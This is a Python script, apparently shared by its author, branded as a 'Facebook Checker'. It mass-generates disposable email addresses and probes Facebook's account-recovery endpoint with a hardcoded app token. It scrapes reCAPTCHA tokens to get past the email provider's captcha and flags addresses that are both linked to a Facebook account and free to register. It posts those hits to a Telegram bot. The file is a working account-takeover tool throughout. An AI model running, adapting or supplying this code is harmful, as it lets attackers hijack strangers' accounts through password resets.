from requests import post as pp
from user_agent import generate_user_agent as gg
from random import choice as cc
from random import randrange as rr
import re
import json
import re
import requests
import random
from uuid import uuid4
import json
import re
import requests
import random
import time
from uuid import uuid4
from threading import Thread, Lock
import os
import base64
import sys
from requests import get
try:
  from bs4 import BeautifulSoup
  import requests
except:
  os.system("pip install requests")
  import requests
try:
  from user_agent import generate_user_agent
except:
  os.system("pip install user_agent")
  from user_agent import generate_user_agent

try:
  from hashlib import md5
except:
  os.system("pip install hashlib")
  from hashlib import md5
try:
  from random import choice
except:
  os.system("pip install random")
  from random import choice
try:
  from concurrent.futures import ThreadPoolExecutor
except:
  os.system("pip install concurrent.futures")
  from concurrent.futures import ThreadPoolExecutor
import signal

# ═══════════════ لوجو Mikel ═══════════════
def print_logo():
    logo = r"""
    ╔══════════════════════════════════════════════════════════╗
    ║                                                          ║
    ║        ███╗   ███╗██╗██╗  ██╗███████╗██╗                ║
    ║        ████╗ ████║██║██║ ██╔╝██╔════╝██║                ║
    ║        ██╔████╔██║██║█████╔╝ █████╗  ██║                ║
    ║        ██║╚██╔╝██║██║██╔═██╗ ██╔══╝  ██║                ║
    ║        ██║ ╚═╝ ██║██║██║  ██╗███████╗███████╗           ║
    ║        ╚═╝     ╚═╝╚═╝╚═╝  ╚═╝╚══════╝╚══════╝           ║
    ║                                                          ║
    ║                ♛  Mikel  Tool  ♛                        ║
    ║                                                          ║
    ║              [ Facebook Checker - Mikel ]                ║
    ║                                                          ║
    ║                   By : @Mikel1d                         ║
    ║                                                          ║
    ╚══════════════════════════════════════════════════════════╝
    """
    print(f"\033[1;36m{logo}\033[0m")

print_logo()
# ══════════════════════════════════════════

token = input('\033[1;32m[⊰⊱]\033[1;37m  TOKEN : ')
print()
ID=input('\033[1;32m[⊰⊱]\033[1;37m  ID : ')
os.system("clear")
g_ch = 0
bads_email = 0
bads_ch = 0
hits = 0
BLUE = '\033[94m'
RESET = '\033[0m'
BOLD = '\033[1m'
YELLOW = '\033[93m'
RED = '\033[91m'
GREEN = '\033[92m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'
C = "\033[1;97m" 
B = '\033[2;36m'

used_usernames = set()  
lock = Lock()
counter_lock = Lock()

def update_counter():
    global hits, g_ch, bads_email, bads_ch
    if counter_lock.acquire(timeout=0.001):
        try:
            sys.stdout.write("\033[K\r")
            sys.stdout.write(
                f"{GREEN}Hits: {hits} | {YELLOW}Good CH: {g_ch} | {YELLOW}Bad Email: {bads_email} | {RED}Bad: {bads_ch} | {B}By: @Mikel1d{RESET}"
            )
            sys.stdout.flush()
        finally:
            counter_lock.release()

def solve_recaptcha():
	try:
		
		anchor_url = "https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LfEUPkgAAAAAKTgbMoewQkWBEQhO2VPL4QviKct&co=aHR0cHM6Ly9oaTIuaW46NDQz&hl=en&v=XrIDux0s7SoNe6_IHkjGC92W&size=invisible"
		params = anchor_url.split('?')[1]
		r = requests.get(f'https://www.google.com/recaptcha/enterprise/anchor?{params}', timeout=10)
		token = r.text.split('recaptcha-token" value="')[1].split('"')[0]
		payload = f"v={params.split('v=')[1].split('&')[0]}&reason=q&c={token}&k=6LfEUPkgAAAAAKTgbMoewQkWBEQhO2VPL4QviKct&co=aHR0cHM6Ly9oaTIuaW46NDQz&hl=en&size=invisible"
		headers = {
			"User-Agent": "Mozilla/5.0",
			"Referer": f"https://www.google.com/recaptcha/enterprise/anchor?{params}",
			"Content-Type": "application/x-www-form-urlencoded"
		}
		resp = requests.post('https://www.google.com/recaptcha/enterprise/reload', data=payload, headers=headers)
		return resp.text.split('resp","')[1].split('"')[0]
	except:
		return None

def check_email(email):
    global badmil
    user = email
    if "@" in email:
        
        domain = email.split("@")[1]
        email = email.split("@")[0]
    solve = solve_recaptcha() 
    
    data = {
    'domain': domain,
    'prefix': email,
    'recaptcha': solve,
    }

    headers = {
    'User-Agent': "Mozilla/5.0",
    'Accept': "application/json, text/plain, */*",
    'authorization': "Basic bnVsbA==",
    }

    response = requests.post("https://hi2.in/api/custom", data=data, headers=headers)
    res = response.json()
    
    if "already taken" in str(res):
    	return "Bad"
    else:
    	return "good"
    	
def info(email):
  try:
  	msg = f'''

╔══════ ░ Mikel ░ ══════╗
┌ [ Facebook ✅ ] 
───────────────────
│ Email: {email}
───────────────────
│ Bot : @fakemailbot
╚══════ ░ Mikel ░ ══════╝
🥶 By @Mikel1d | @Mikel224 🔥
	'''
  	msg2 = f'''
  	
╔══════ ░ Mikel ░ ══════╗
┌ [ Facebook ✅ ] 
───────────────────
│ Email: {email}
───────────────────
│ Bot : @fakemailbot
╚══════ ░ Mikel ░ ══════╝
🥶 By @Mikel1d | @Mikel224 🔥

'''	
  	with open('face15.txt','a') as ff:
  	   ff.write(f'{msg}\n')
  	try:requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={msg}")
  	except:pass
  	print(msg2)
  	update_counter()

  except:
  	msg = f'''
╔══════ ░ Mikel ░ ══════╗
┌ [ Facebook ✅ ] 
───────────────────
│ Email: {email}
───────────────────
│ Bot : @fakemailbot
╚══════ ░ Mikel ░ ══════╝
🥶 By @Mikel1d | @Mikel224 🔥
        '''
  	try:requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={msg}")
  	except:pass
  	with open('face15.txt','a') as ff:
  	     ff.write(f'{msg}\n')
  	print(msg)
  	update_counter()

def naif(email):
  global g_ch,bads_email,hits
  try:
    if check_email(email) == "good":
    	hits+=1
    	info(email)
    else:
    	bads_email+=1
    	update_counter()

  except:pass


USER_AGENTS_FB = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
]



def build_variables_payload(email):
    client_input_params = {
        "text_input_id": "lh37sk:580",
        "flash_call_permissions_status": {
            "READ_PHONE_STATE": "DENIED",
            "READ_CALL_LOG": "DENIED",
            "ANSWER_PHONE_CALLS": "DENIED",
        },
        "was_headers_prefill_available": 0,
        "sfdid": str(uuid4()),
        "attestation_result": {"data": "", "signature": "", "keyHash": ""},
        "fetched_email_token_list": {},
        "search_query": email,
        "android_build_type": "",
        "sim_state": 5,
        "accounts_list": [],
        "is_oauth_without_permission": 0,
        "ig_oauth_token": [],
        "search_screen_type": "email",
        "is_whatsapp_installed": 1,
        "lois_settings": {"lois_token": ""},
        "was_headers_prefill_used": 0,
        "headers_infra_flow_id": str(uuid4()),
        "fetched_email_list": [""],
        "sso_accounts_auth_data": [],
        "encrypted_msisdn": "",
    }

    server_params = {
        "event_request_id": str(uuid4()),
        "is_from_logged_out": 0,
        "device_id": str(uuid4()),
        "waterfall_id": str(uuid4()),
        "is_platform_login": 0,
        "context_data": "",
        "access_flow_version": "F2_FLOW",
        "is_from_logged_in_switcher": 0,
    }

    inner = {"client_input_params": client_input_params, "server_params": server_params}
    return {
        "params": {
            "params": json.dumps(inner),
            "bloks_versioning_id": "24ee0ea0cc798aaa4d3e3c8a9055885112fb3d4213c4175bb6e9c76972ec34d1",
            "app_id": "com.bloks.www.caa.ar.search.async",
        },
        "scale": "3",
    }

def build_payload(variables_payload: dict) -> dict:
    return {
        "method": "post",
        "format": "json",
        "locale": "en_EN",
        "purpose": "fetch",
        "fb_api_req_friendly_name": "FbBloksActionRootQuery-com.bloks.www.caa.ar.search.async",
        "fb_api_caller_class": "graphservice",
        "client_doc_id": "119940804216386667488826941930",
        "variables": json.dumps(variables_payload),
        "client_trace_id": str(uuid4()),
    }

def build_headers() -> dict:
    return {
        "User-Agent": random.choice(USER_AGENTS_FB),
        "x-fb-friendly-name": "FbBloksActionRootQuery-com.bloks.www.caa.ar.search.async",
        "authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
        "x-fb-conn-uuid-client": str(uuid4()).replace("-", ""),
    }

def analyze_response_text(response_text: str) -> tuple:
    cleaned = response_text.encode("utf-8").decode("unicode-escape", errors="ignore")
    exists_markers = ["fbcdn.net", "Get code or link via email", "Enter password to log in"]
    missing_markers = ["isn't connected to an account", "We couldn't find your account"]

    if any(marker in cleaned for marker in exists_markers):
        user_id_match = re.search(r'"obfuscated_id":"([^"]+)"', cleaned)
        user_id = user_id_match.group(1) if user_id_match else None
        return True, user_id
    elif any(marker in cleaned for marker in missing_markers):
        return False, None
    else:
        return None, None

def check_facebook_connection(email):
    vars_payload = build_variables_payload(email)
    payload = build_payload(vars_payload)
    headers = build_headers()
    try:
        resp = requests.post("https://graph.facebook.com/graphql", data=payload, headers=headers, timeout=15)
        
        try:
            resp_json = resp.json()
            response_text = json.dumps(resp_json, ensure_ascii=False)
        except ValueError:
            response_text = resp.text
        return analyze_response_text(response_text)
    except requests.RequestException as e:
        return None, None

def generate_random_email():

    global used_usernames
    while True:

        user4 = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(6))

        chosen_user = user4

        with lock:
            if chosen_user in used_usernames:
                continue  
            used_usernames.add(chosen_user)

        chos = random.choice(["@hi2.in", "@telegmail.com"])
        email = chosen_user + chos
        return email

def task():

    global g_ch, bads_ch
    email = generate_random_email()

    exists_result = check_facebook_connection(email)
    exists = exists_result[0] if exists_result else None

    if exists is True:
        g_ch += 1
        naif(email)
    else:  
        bads_ch += 1
        update_counter()

if __name__ == "__main__":
    print("\n" * 2)
    NUMBER_OF_EMAILS_TO_CHECK = 100000
    
    with ThreadPoolExecutor(max_workers=10) as executor: 
        futures = [executor.submit(task) for _ in range(NUMBER_OF_EMAILS_TO_CHECK)]

        for future in futures:
            future.result()